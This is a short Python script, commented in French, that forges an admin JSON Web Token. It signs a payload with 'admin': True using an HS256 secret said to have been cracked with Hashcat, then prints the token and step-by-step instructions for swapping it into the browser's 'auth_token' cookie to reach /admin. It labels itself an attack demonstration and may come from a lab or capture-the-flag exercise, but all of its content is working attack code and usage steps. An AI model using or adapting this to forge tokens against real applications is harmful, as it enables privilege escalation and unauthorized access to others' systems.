import jwt
import datetime

# Configuration - Le secret craqué avec Hashcat
SECRET = "d0i4xj7qwtv103a6"
ALGORITHM = "HS256"

# Payload forgé avec élévation de privilège
payload = {
    "sub": "1234567890",
    "name": "admin",
    "admin": True,  # ÉLÉVATION DE PRIVILÈGE
    "iat": int(datetime.datetime.utcnow().timestamp()),
    "exp": int((datetime.datetime.utcnow() + datetime.timedelta(hours=2)).timestamp())
}

# Génération du token forgé
token = jwt.encode(payload, SECRET, algorithm=ALGORITHM)

print("=" * 60)
print("SCRIPT DE FORGE JWT - DÉMONSTRATION D'ATTAQUE")
print("=" * 60)
print()
print(f"Secret utilisé: {SECRET}")
print(f"Algorithme: {ALGORITHM}")
print()
print("Payload forgé:")
print(f"  - sub: {payload['sub']}")
print(f"  - name: {payload['name']}")
print(f"  - admin: {payload['admin']} (PRIVILÈGE ADMIN!)")
print()
print("=" * 60)
print("JWT FORGÉ:")
print("=" * 60)
print(token)
print()
print("=" * 60)
print("INSTRUCTIONS:")
print("=" * 60)
print("1. Ouvrir les DevTools du navigateur (F12)")
print("2. Aller dans Application > Cookies")
print("3. Modifier la valeur de 'auth_token' avec le JWT ci-dessus")
print("4. Rafraîchir la page")
print("5. Accéder à /admin")
print()
